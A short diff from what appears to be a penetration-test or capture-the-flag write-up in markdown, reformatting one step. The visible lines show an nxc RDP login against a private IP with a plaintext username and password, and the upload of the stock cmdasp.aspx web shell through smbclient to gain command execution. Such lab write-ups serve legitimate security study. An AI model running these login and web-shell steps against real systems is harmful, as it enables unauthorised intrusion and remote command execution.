@@ -136,9 +136,8 @@ $ nxc rdp 10.80.131.73 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
 ### 2. Penetration
 
 Check for RCE first:  
-```text
-/usr/share/webshells/aspx/cmdasp.aspx -> smbclient
-```
+
+Move /usr/share/webshells/aspx/cmdasp.aspx -> smbclient
 
 ```powershell
 > put cmdasp.aspx
